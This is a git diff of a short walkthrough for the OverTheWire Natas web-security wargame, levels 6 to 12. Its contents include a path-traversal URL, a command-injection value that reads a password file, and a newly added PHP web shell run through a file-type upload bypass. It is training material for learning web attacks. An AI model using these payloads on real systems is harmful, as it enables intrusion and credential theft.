@@ -54,12 +54,14 @@ and now we should do it manually `http://natas6.natas.labs.overthewire.org/index
 check inspector and you find key
 
 # Level 7 
+
 Level 7 is bassically same as Level 6
   * take a look into source code
   * you will find something like this ` hint: password for webuser natas8 is in /etc/natas_webpass/natas8`
   * and go this link via page `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
 
 # Level 8 
+
 Level 8 is same as level 6 but pin-code placed in the script you should decode it
 ```
  echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p
@@ -75,6 +77,7 @@ echo b3ViV1lmMmtCcQ== | base64 -d
 oubWYf2kBq  #key   
 ```
 # Level 9 
+
 so solve this case we should use `comanline injection`
 as you could see in source code that input value directly goes through db without any hiccups
 `; cat /etc/natas_webpass/natas10 #`--> Key to next level
@@ -83,4 +86,13 @@ as you could see in source code that input value directly goes through db withou
 Solution in this problem is use another method of injection
 `.* cat /etc/natas_webpass/natas11`
  # Level 11
+ 
  [link to solution](https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/28/natas11/)
+
+ # Level 12
+ 
+ In this level you should create a php file on your pc and write own script to get pass
+ `<?php echo shell_exec("ls");?>` but dont send it yet you need change in inspector type from jpg to php
+ and than upload file it should execute. 
+ So ones it worked you should change you script to `<?php echo shell_exec("cat /etc/natas_webpass/natas13");?>` 
+ 
